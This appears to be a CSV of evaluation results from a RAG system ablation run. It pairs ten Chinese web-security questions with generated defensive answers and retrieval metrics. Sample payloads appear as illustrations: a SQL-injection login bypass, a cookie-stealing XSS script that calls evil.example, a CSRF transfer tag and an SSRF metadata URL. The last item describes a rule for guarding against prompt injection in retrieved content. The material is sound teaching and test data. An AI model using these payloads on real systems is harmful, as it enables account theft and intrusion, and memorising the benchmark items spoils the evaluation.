taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,ndcgAtK,mrr,keywordHitRate,citationMatched,route,rerankUsed,contextTokens,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
21,消融-Full全开,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入的定义与防御  ## 一、什么是 SQL 注入  SQL 注入(SQL Injection, **CWE-89**)是一种将恶意 SQL 语句插入应用程序查询参数,从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列,可能导致以下危害 [1]:  - **数据泄露** - **数据篡改** - **认证绕过** - **服务器接管**  ## 二、攻击原理  当应用程序将用户输入**直接拼接**进 SQL 语句时,攻击者可以构造特殊输入改变语句逻辑 [1]。  以登录场景为例,拼接式查询如下(危险写法):  ```sql SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`,拼接后的语句变为:  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 将后续条件注释掉,从而绕过密码校验 [1]。  ## 三、防御方案  ### 1. 使用参数化查询(核心防御)  - **避免拼接式 SQL**,所有 SQL 语句一律使用参数化方式传递用户输入。 - 在 **MyBatis** 中,全部使用 `#{}` 占位符,而非 `${}` 字符串替换 [2]。 - 对于**动态排序字段**等无法参数化的场景,使用**白名单映射**限定可选值 [2]。  ### 2. 输入校验  在 Controller 层使用 `@Valid` + JSR-303 注解(如 `@NotBlank`、`@Size`、`@Pattern`)对输入进行严格校验,并通过全局异常处理器转换为统一错误响应,避免 500 堆栈泄露 [3]。  ### 3. 通用防御原则  SQL 注入与命令注入等漏洞的共同根因是""**用户输入被拼接进解释型上下文**"",因此可遵循以下通用防御范式 [4]:  1. **优先使用无需拼接的安全 API**(参数化); 2. 无法参数化时,做**严格白名单校验**(如 IP 正则、枚举值),拒绝元字符; 3. **失败即拒绝**,不做""过滤黑名单""式的修补; 4. **纵深防御**:最小权限、隔离运行环境、监控告警。  ### 4. 附加加固建议  - 生产环境关闭不必要的接口文档(`springdoc.api-docs.enabled: false`),Actuator 只暴露 health 端点,减少攻击面 [3]; - 记录关键审计事件(如登录成功/失败、越权尝试),便于及时发现注入攻击行为 [3]。  ---  **总结**:SQL 注入的本质是用户输入被拼入 SQL 上下文后改变了语句逻辑 [1][4]。防御的核心是**参数化查询** [2],辅以**输入白名单校验** [3][4] 和**纵深防御** [4],从根因上消除拼接风险。",938,16311,17252,1022,831,1,0.2000,1.0000,1.0000,1.0000,0.7500,1,HYBRID,1,688,0,0,0,0
21,消融-Full全开,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 核心区别  | 写法 | 本质 | 安全性 | |------|------|--------| | `#{}` | 参数化绑定（预编译占位符） | ✅ 安全，推荐使用 [1][2] | | `${}` | 直接字符串拼接 | ❌ 危险，存在 SQL 注入风险 [1] |  ## 原理说明  **`#{}` 参数化绑定**：使用预编译语句，用户输入只作为数据绑定，**不参与 SQL 语法解析**，因此即使输入中包含恶意 SQL 片段，也只会被当作普通数据处理 [2]。  **`${}` 字符串拼接**：会将用户输入直接拼接到 SQL 语句中，参与 SQL 语法解析，攻击者可借此注入恶意 SQL 语句 [1]。  ## 代码对比  ```xml <!-- 正确: 参数化, 输入只作为数据 --> <select id=""findUser"">     SELECT * FROM users WHERE id = #{id} </select>  <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">     SELECT * FROM users ORDER BY ${column} </select> ``` [1]  ## 实践建议  1. **首选 `#{}`**：所有用户输入都应通过 `#{}` 绑定，MyBatis 项目应全部使用 `#{}` [2][3]。  2. **无法参数化的场景（如动态排序字段）使用白名单映射**：`${}` 唯一合理的用途是列名、排序方向等无法用占位符传递的语法元素，此时必须配合白名单校验 [1][4]：  ```java private static final Map<String, String> ORDER_WHITE_LIST = Map.of(     ""createTime"", ""created_at"",     ""username"", ""username"" ); String column = ORDER_WHITE_LIST.getOrDefault(requestColumn, ""created_at""); ``` [4]  3. **输入校验配合**：对输入进行白名单校验（类型、长度、格式、字符集），例如 ID 参数只允许数字，作为纵深防御手段 [1]。  ## 总结  > `#{}` 是参数化绑定，安全；`${}` 是字符串拼接，有注入风险，严禁直接用于拼接用户输入；动态排序等特殊场景必须用白名单映射处理 [1][2][3][4]。",791,15175,15968,1006,753,1,0.6000,1.0000,0.9675,1.0000,1.0000,1,HYBRID,1,688,0,0,0,0
21,消融-Full全开,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 的类型与防御  ## 一、XSS 的三种类型  根据知识库 [1]，XSS(CWE-79)共分为三种类型：  | 类型 | 特点 | 危害程度 | |------|------|----------| | **反射型 XSS** | 恶意脚本来自用户请求参数，服务器将其""反射""回响应页面，常见于搜索结果页 | 单次、针对性触发 | | **存储型 XSS** | 恶意脚本被持久化存储到数据库(如评论、个人简介)，所有访问者都会执行 | **危害最大** [1] | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数)，数据不经过服务器 | 纯前端触发 |  **攻击原理示例** [1]：评论功能未过滤输出时，攻击者可提交如下脚本，窃取所有浏览用户的会话 Cookie:  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  知识库还提示了一种特殊来源：**文件上传也可引入存储型 XSS**——上传含脚本的 HTML/SVG 文件并被浏览器直接渲染 [5]。  ## 二、知识库中可查到的防御相关措施  1. **保护会话凭证不被 XSS 窃取**：避免将 Token 存储在 `localStorage`(易受 XSS 窃取)，优先使用 `HttpOnly Cookie`(天然防 XSS 窃取，但需配套 CSRF 防御)[3][4]。 2. **修复 XSS 是 CSRF 防御的前置条件**：XSS 利用站点对输出的信任，攻击脚本可读取 Token,从而绕过 CSRF Token 防御 [2]。 3. **阻断上传型存储 XSS**:对上传文件执行扩展名白名单校验(拒绝一切可执行扩展名)、文件头校验、内容解析校验，防止含脚本的 HTML/SVG 被渲染 [5]。  ## 三、知识库未充分覆盖的部分(通用知识，无知识库引用)  > ⚠️ 当前知识库片段未包含 XSS 的完整防御方案细节(如输出编码、CSP 等)。以下为**通用安全常识补充**，仅供学习参考：  - **输出编码(核心防线)**：在将数据输出到 HTML、JavaScript、URL、CSS 等不同上下文时，使用对应的编码函数(如 HTML 实体编码 `&lt;` `&gt;` `&amp;` 等)，确保数据被当作“文本”而非“代码”执行。 - **安全的 DOM 操作**：前端优先使用 `textContent` / `setAttribute`,避免 `innerHTML`、`document.write` 写入不可信数据(针对 DOM 型 XSS)。 - **输入校验与净化**：对用户输入做格式校验，富文本场景使用成熟净化库(如 DOMPurify)过滤危险标签与属性。 - **内容安全策略(CSP)**:通过 `Content-Security-Policy` 响应头限制脚本来源，作为纵深防御层。 - **Cookie 加固**：为 Cookie 追加 `HttpOnly`、`Secure` 属性，限制 XSS 窃取后的利用面。  **总结**：三种 XSS 的根源都是“不可信数据被当作代码执行”，防御核心是在输出环节做好上下文相关的编码与净化，同时配合 HttpOnly Cookie [3][4]、CSP 等纵深防御措施。",1134,45962,47099,1660,1892,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,HYBRID,1,1239,0,0,0,0
21,消融-Full全开,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导已登录用户的浏览器, 在用户不知情的情况下向目标站点发送恶意请求。由于请求携带了用户的合法会话凭证(如 Cookie), 服务器难以区分这是否为用户本人意愿, 从而以用户身份执行了操作 [1]。  ## 二、攻击原理  以银行转账场景为例: 用户已登录 `bank.example`, 会话 Cookie 仍然有效。攻击者在第三方页面埋入:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该页面时, 浏览器自动携带 Cookie 发起转账请求, 攻击完成 [1]。  ### 攻击成功的三个关键条件  1. 受害者在目标站点持有有效会话; 2. 目标操作仅需 Cookie 即可认证, 无二次确认; 3. 攻击者能诱导受害者访问恶意页面 [1]。  ## 三、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token, 嵌入表单或请求头; 请求到达时校验 Token 是否匹配。攻击者无法跨站读取该 Token, 伪造请求即告失败 [1]。  ```html <form method=""post"" action=""/transfer"">   <input type=""hidden"" name=""_csrf"" value=""随机Token"">   ... </form> ```  以 Spring Security 为例, 其默认启用 CsrfFilter, 对非幂等请求(POST/PUT/DELETE)校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头 [1]。  ### 2. SameSite Cookie  现代浏览器支持 SameSite 属性, 限制 Cookie 在跨站请求中发送 [1]:  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`: 完全不跨站发送; - `Lax`: 导航级 GET 请求允许携带(浏览器默认)[1][2]。  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名, 拒绝来源不明的跨站请求 [2]。  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义: 查询用 GET, 修改用 POST/PUT/DELETE, 从根源上杜绝 img/script 标签型 CSRF [2]。  ### 5. 二次认证  对转账、改密、删除等高危操作要求再次输入密码、验证码或动态口令 [2]。  ## 四、补充注意事项  ### CSRF 与 XSS 的关系  - CSRF 利用服务器对浏览器的信任, 攻击的是""用户身份""; XSS 利用站点对输出的信任, 攻击的是""浏览器执行环境"" [2]。 - XSS 通常可以用来绕过 CSRF Token 防御(脚本可读取 Token), 因此**修复 XSS 是 CSRF 防御的前置条件** [2]。  ### 前后端分离 / JWT 场景  若使用 JWT 进行认证, 存储位置的选择会影响防御重点: Token 存于 localStorage 易受 XSS 窃取, 需配套严格的 XSS 防御; 存于 HttpOnly Cookie 天然防 XSS 窃取, 但需配套 CSRF 防御 [3]。  ## 五、防御方案小结  | 防御手段 | 核心思路 | 引用 | |---|---|---| | CSRF Token | 服务端校验随机令牌, 攻击者无法跨站读取 | [1] | | SameSite Cookie | 浏览器层面限制跨站携带 Cookie | [1][2] | | Origin/Referer 校验 | 服务端验证请求来源域名 | [2] | | HTTP 语义规范 | 写操作不用 GET, 杜绝标签型伪造 | [2] | | 二次认证 | 高危操作增加身份再确认 | [2] |  实践中建议**多层防御组合使用**: 以 CSRF Token 为主, 配合 SameSite Cookie 与来源校验, 并对高危操作叠加二次认证, 同时优先修复 XSS 漏洞以避免 Token 防御被绕过 [1][2]。",1041,25986,27029,1685,1188,1,0.4000,1.0000,1.0000,1.0000,1.0000,1,HYBRID,1,1303,0,0,0,0
21,消融-Full全开,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"# SSRF 概念解析  ## 一、什么是 SSRF  **SSRF(Server-Side Request Forgery,服务端请求伪造，CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求[2]。其核心危害在于：**请求由内网服务器发出**，攻击者可借此探测内网、访问内网服务、读取云平台元数据，甚至借助内网管理接口控制服务器[2]。SSRF 也被列入 OWASP Top 10 2021 的 A10 类别[4]。  ## 二、云环境中最典型的危害：云元数据泄露  在云环境中，SSRF 最典型的危害是**云元数据泄露**：  - 攻击者利用 SSRF 请求云平台元数据服务地址 `http://169.254.169.254/latest/meta-data/`,可**获取实例凭证(临时访问密钥)**，进而**接管云资源**[2]。 - 这意味着一旦服务器存在 SSRF 漏洞，攻击者可能绕过网络边界，直接获得云账号凭证，危害远超普通内网探测。  需要注意的是，`169.254.0.0/16` 属于链路本地地址段，是 SSRF 校验中必须纳入黑名单的内网段之一[1]。  ## 三、针对性防御建议  针对云环境 SSRF 危害，可采取以下措施[1]:  | 防御层 | 措施 | |--------|------| | 协议层 | 仅允许 `http`/`https`,拒绝 `file`、`gopher`、`dict` 等危险协议[1] | | 校验层 | 解析域名后校验真实 IP 是否属于内网段(含 `169.254.0.0/16`),并防范 DNS 重绑定[1] | | 网络层 | 云环境**禁用或加固元数据服务(如启用 IMDSv2)**;外联服务部署在独立网段并限制白名单出口[1] | | 响应层 | 禁止自动跟随重定向，不回显完整响应，限制超时与响应大小[1] |  > 💡 **小结**：SSRF 的本质是“借服务器之手发请求”，而云元数据服务凭证泄露是其最具杀伤力的利用路径，因此 IMDSv2 加固与真实 IP 校验是云环境防御的重中之重[1][2]。",890,14683,15574,1426,835,1,0.4000,1.0000,1.0000,1.0000,1.0000,1,HYBRID,1,984,0,0,0,0
21,消融-Full全开,RAG_LLM,6,JWT 常见的安全风险有哪些?,# JWT 常见安全风险解析  根据知识库《JWT 安全实践指南》，JWT 作为无状态认证凭证（由 `Header.Payload.Signature` 三部分组成），存在以下五类典型安全风险 [1]：  ---  ## 1. 算法混淆攻击  - **风险原理**：服务端若信任 Token Header 中声明的算法，攻击者可以：   - 将 `alg` 改为 `none`，绕过签名验证；   - 将 RS256 篡改为 HS256，用公钥充当 HMAC 密钥，从而伪造合法签名 [1]。 - **防御方案**：服务端**硬编码固定算法**，不从 Token 中读取算法声明 [1]。  ## 2. 密钥强度不足与硬编码  - **风险原理**：   - 弱密钥（如 `secret`、`123456`）可被暴力破解；   - 硬编码在源码中的密钥一旦泄露即全面失守 [1]。 - **防御方案**：密钥仅通过**环境变量或密钥管理服务（KMS）注入**，长度不低于 **256 位** [1]。  ## 3. 敏感信息泄露  - **风险原理**：Payload 仅做 Base64 编码，**明文可读**，任何人解码即可查看内容 [1]。 - **防御方案**：严禁在 Payload 中存放密码、手机号等敏感数据 [1]。  ## 4. Token 无法主动失效  - **风险原理**：JWT 是无状态的，签发后在过期前始终有效。用户改密、注销或账号被盗时，旧 Token 依然可用 [1]。 - **防御方案**：   - 引入服务端黑名单（如 Redis）；   - 缩短有效期并配合刷新令牌；   - 在签名中加入版本号，随密钥变更使旧 Token 失效 [1]。  ## 5. 存储位置风险  - **localStorage 存储**：易受 XSS 攻击窃取，需配套严格的 XSS 防御 [1]。 - **HttpOnly Cookie 存储**：天然防 XSS 窃取，但需配套 CSRF 防御 [1]。  ---  ## 补充说明（无知识库直接对应内容，为通用知识）  上述“密钥硬编码、弱加密”问题与 OWASP Top 10 (2021) 中的 **A02 加密失败**（敏感数据明文传输/存储、弱算法、硬编码密钥）密切相关，该类问题的通用防御包括全站 HTTPS、密钥走 KMS/环境变量等 [3]。  **核心防御原则总结**：固定算法、强密钥托管、Payload 最小化、可失效机制、合理选择存储位置，是 JWT 安全落地的五大关键点 [1]。,0,20338,20341,1203,929,1,0.2000,1.0000,1.0000,1.0000,0.6000,1,FAST,0,853,0,0,0,0
21,消融-Full全开,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、主要安全风险  根据知识库，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]：  1. **WebShell 上传**：攻击者上传可执行脚本(如 `shell.jsp`、`shell.php`),直接获得服务器控制权 [1]。 2. **目录穿越**：利用 `../../` 等路径将文件写到任意路径，覆盖关键配置文件 [1]。 3. **存储型 XSS**:上传含脚本的 HTML/SVG 文件，被浏览器直接渲染后执行恶意脚本 [1]。 4. **拒绝服务(DoS)**:上传超大文件或畸形压缩包，耗尽服务器磁盘与内存资源 [1]。 5. **恶意文件分发**：服务器被攻击者当作恶意文件的中转站 [1]。  ## 二、防御措施  ### 1. 严格校验文件类型(白名单) [1]  - 校验**扩展名白名单**(如仅允许 pdf、txt、md、docx),拒绝一切可执行扩展名 [1] - 校验**文件头**以防止仅修改扩展名的绕过手段；但需注意文件头本身可被伪造，应采用“白名单 + 头校验”配合的方式 [1] - 使用**成熟解析库**读取文件内容，拒绝解析失败或内容异常的文件 [1]  ### 2. 限制文件大小 [3]  - **应用层**限制单文件大小(如 50MB) [3] - **Web 服务器层**限制请求体大小(如 nginx 的 `client_max_body_size`) [3] - 设置**上传频率与配额限制**，防止滥用 [3]  ### 3. 隔离存储 [3]  - 上传目录**不赋予执行权限**，防止 WebShell 被执行 [3] - 静态资源通过**单独域名/CDN** 提供，与应用域隔离 [3] - 下载时设置 `Content-Disposition: attachment` 与正确的 `Content-Type`,避免浏览器直接渲染上传内容 [3]  ### 4. 内容检测 [3]  - 对文档进行**病毒扫描** [3] - 对图片**重新编码**，消解隐写与内嵌脚本风险 [3] - 对 PDF/Office 文档，**解析失败即拒绝** [3]  ### 5. 存储文件重命名 [1]  知识库提到应“重命名存储”上传文件 [1],这是防止路径穿越和覆盖关键文件的重要手段(具体细节知识库片段未完整给出，此处依据片段结论标注)。  ## 三、补充：RAG/知识库系统场景下的额外要求  若上传功能用于知识库问答系统(文档会经过“解析 → 清洗 → 分块 → 向量化”流水线)，还应做到 [3]:  1. 白名单限制为可解析的文档类型(PDF/TXT/MD/DOCX) [3] 2. 解析失败时将文档状态标记为 **FAILED** 并记录原因，不中断服务 [3] 3. 文件内容仅用于向量化检索，**原文件不直接暴露下载 URL**;确需下载时经鉴权接口返回 [3]  ---  **总结**：文件上传的核心防御思路是“**白名单校验 + 大小限制 + 存储隔离 + 内容检测**”多层配合，任何单一措施都可能被绕过 [1][3]。",5631,23738,29397,916,1097,1,0.4000,1.0000,0.9197,1.0000,0.7500,1,DECOMPOSE,1,626,0,0,0,0
21,消融-Full全开,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一句话概括  两者都是“只做了认证、没做授权”导致的越权漏洞，但**校验的对象不同、越权方向不同**：  - **BOLA(对象级授权失效)**：没校验“这个**数据对象**是不是你的”，导致**横向越权** [1] - **BFLA(功能级授权失效)**：没校验“你的**角色**能不能调用这个功能”，导致**纵向越权** [4][5]  ## 核心区别对比  | 维度 | BOLA | BFLA | |------|------|------| | 中文名称 | 对象级授权失效 [1] | 功能级授权失效 [4][5] | | 漏洞本质 | 只验证“你是谁”(认证)，不验证“这个对象是不是你的”(授权)[1] | 接口只做认证不做角色校验 [4] | | 越权方向 | **横向越权**(同级用户之间互访数据)[1] | **纵向越权**(低权限访问高权限功能)[4] | | 典型场景 | A 用户把 URL 中对象 ID 换成 B 用户的，仍能查看 [1] | 普通用户直接调用管理接口如 `POST /api/admin/users/42/disable` [4][5] | | 校验重点 | 逐对象校验**数据归属** [2] | 逐功能/逐接口校验**角色** [2][5] |  ## 详细解析  ### 1. BOLA:横向越权  API 只确认了请求者身份合法，但没有确认请求的资源归属于该用户：  ``` GET /api/invoices/5001  # A 用户查看自己的发票 → 200 GET /api/invoices/5002  # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  BOLA 位居 OWASP API Security Top 10 之首，是数据泄露事件的最主要根因 [1]。高发场景包括自增主键易遍历、UUID 被误认为“不可猜测即安全”、批量/导出/子资源路径遗漏校验等 [1]。  **防御核心**：每次数据访问都把“归属”写进查询条件，服务端逐对象校验 [1][2][5]:  ```java Invoice invoice = invoiceMapper.selectOne(     Wrappers.<Invoice>lambdaQuery()         .eq(Invoice::getId, invoiceId)         .eq(Invoice::getUserId, currentUserId)); // 关键行: 强制带归属 ```  同时建议返回 404 而非 403,避免攻击者借此确认对象存在性 [4]。  ### 2. BFLA:纵向越权  接口只验证了用户已登录，但没有验证该用户的**角色**是否有权调用此功能，普通用户可直接调用管理功能 [4]:  ``` POST /api/admin/users/42/disable  # 普通用户调用管理接口 ```  **防御核心**：服务端逐接口做角色校验(注解/拦截器)，权限默认拒绝、显式放行 [3][5];管理路由独立分组(路径前缀/网关)并加额外网关校验；不信任前端隐藏按钮 [3][5]。例如通过拦截器读取注解校验角色 [3]:  ```java RequireAdmin ra = handlerMethod.getMethodAnnotation(RequireAdmin.class); if (ra != null && !""ADMIN"".equals(AuthContext.getRole())) {     throw new BusinessException(403, ""无权限访问""); } ```  ## 测试方法上的区别  在授权测试中，两者分别验证 [3]:  1. **BOLA 测试**：用户 A 正常请求资源后，**替换对象 ID 为用户 B 的资源**，观察是否返回数据 2. **BFLA 测试**：**普通用户直接调用管理接口**，观察是否被执行  实践中可结合自动化，构建“用户 × 接口 × 对象”的授权测试矩阵批量回归 [3]。  ## 总结  简单记忆：**BOLA 管的是“数据是不是你的”(对象归属，横向)，BFLA 管的是“功能能不能用”(角色权限，纵向)**。二者需配合使用，即服务端“逐对象校验归属 + 逐功能校验角色” [2],且权限判断必须只在服务端完成，前端仅做展示优化 [3]。",739,30430,31170,1546,1568,1,0.6000,1.0000,0.9060,1.0000,1.0000,1,HYBRID,1,1108,0,0,0,0
21,消融-Full全开,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能使用 MD5 存储密码？  ## 一、MD5 的核心缺陷  ### 1. 算法设计目标是“快”，而非“抗破解” MD5/SHA1 属于快速哈希算法，这正是其致命弱点——攻击者计算速度同样极快，彩虹表与暴力破解都非常容易 [1]。  ### 2. 加盐 MD5 也不足够 即使采用“加盐 MD5”方案，仍然存在两个问题： - **盐可被一同拖库**：数据库泄露时盐与哈希同时暴露，无法起到额外保护作用； - **GPU 算力碾压**：现代 GPU 每秒可计算数十亿次 MD5，暴力破解成本极低 [1]。  因此知识库将 MD5/SHA1 归为“危险”级别，加盐 MD5 也仅是“不足”级别 [1]。  ## 二、应该用什么？  **推荐使用自适应慢哈希 + 盐的算法：PBKDF2、BCrypt 或 Argon2**,其成本参数可随硬件升级而调大，持续保持攻击者的破解成本 [1]。  ### BCrypt 推荐方案  BCrypt 是实践中的主流选择，核心优势包括 [1]:  1. **自带随机盐**：相同密码每次哈希结果不同，天然抗彩虹表； 2. **成本因子可调**：哈希轮数为 2^cost,可随硬件进步调大成本因子，维持破解难度； 3. **输出自包含**：形如 `$2a$10$N9qo8uLOickgx2ZMRZoMye...` 的结果串内含算法版本、成本因子、盐与哈希值，校验时直接解析，无需单独存储盐字段。  推荐成本因子设置为 **10-12**(每次哈希约 60-250ms) [1]。  ## 三、代码实践  知识库明确指出：“使用 BCrypt 存储密码，禁止 MD5/SHA1 明文级方案” [2]:  ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册时 String hash = passwordEncoder.encode(rawPassword);  // 登录校验时 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ```  ## 四、总结对照表  | 方案 | 安全性 | 结论 | |------|--------|------| | 明文 | 危险 | 任何泄露即直接暴露 | | MD5/SHA1 | 危险 | 快速哈希,极易被彩虹表与暴力破解攻破 | | 加盐 MD5 | 不足 | 盐可被一同拖库,GPU 破解速度极快 | | PBKDF2/BCrypt/Argon2 | 推荐 | 自适应慢哈希 + 盐,成本参数可随硬件升级 |  > 补充建议(基于知识库 [1]):除算法选择外，还应配合登录防爆破(失败计数 + 锁定/验证码/限流)、全程 HTTPS、登录成功后重置会话 ID 等措施，构建完整的身份认证安全体系。",0,16193,16195,1307,905,1,0.4000,1.0000,0.9197,1.0000,1.0000,1,FAST,0,873,0,0,0,0
21,消融-Full全开,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、核心概念  RAG(Retrieval-Augmented Generation, 检索增强生成)采用 **“先检索、后生成”** 的两阶段架构来增强大语言模型：用户提问后，系统先从外部知识库检索相关内容，再将其作为上下文交给 LLM 生成回答。该架构可缓解 LLM 的三大缺陷：知识截止、幻觉、私域知识缺失 [1]。  ## 二、离线索引阶段  离线索引阶段包含以下 5 个步骤 [1]:  1. **文档解析**：提取 PDF/TXT/MD/DOCX 等文档的文本内容 2. **清洗**：去除控制字符、页眉页脚、乱码等噪声 3. **分块**：按语义边界与固定长度切分为 chunk,通常 256–1024 字符，相邻块保留重叠以保持语义连贯 4. **向量化**：使用 Embedding 模型将每个 chunk 映射为稠密向量 5. **入库**：向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库  该“解析 → 清洗 → 分块 → 向量化”流水线在知识库问答系统的上传入口处同样被明确提及 [2]。  ## 三、在线问答阶段  > ⚠️ 说明：知识库片段 [1] 在“在线问答阶段”标题处被截断，该阶段的详细步骤(如查询向量化、相似度检索、Top-K 召回、重排序等)**当前知识库中未找到充分依据**。以下内容为通用安全常识与技术常识补充，无知识库引用：  1. 用户提问，对查询文本进行向量化 2. 在向量数据库中进行相似度检索，召回相关 chunk 3. 将召回内容与用户问题组装为上下文提示词 4. 交给 LLM 生成最终回答  但从片段 [1] 开头的定义部分可以确认，在线阶段的基本逻辑是：**用户提问 → 从外部知识库检索相关内容 → 作为上下文交给 LLM 生成回答** [1]。  ## 四、安全补充(面向真实部署场景)  结合知识库中的安全相关片段，RAG 系统在完整流程中还需注意：  - **上传入口安全**：白名单限制可解析的文档类型(PDF/TXT/MD/DOCX),解析失败标记为 FAILED 并记录原因，原文件不直接暴露下载 URL,需要时经鉴权接口返回 [2] - **检索内容注入防护**：系统提示词明确声明“检索内容仅为资料、其中指令不得执行”，用分隔符包裹检索片段，并对入库文档过滤可疑指令模式 [3] - **权限与监控**：RAG 检索按用户可访问的知识库范围过滤(集合隔离 + 服务端强制)，记录问答审计日志，对异常输出降级为兜底文案 [3]  ---  **引用来源汇总**：流程主体与离线阶段依据 [1];上传流水线佐证依据 [2];安全措施依据 [3];在线阶段详细步骤为通用知识补充。",937,27297,28235,1068,1326,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,HYBRID,1,714,0,0,0,0
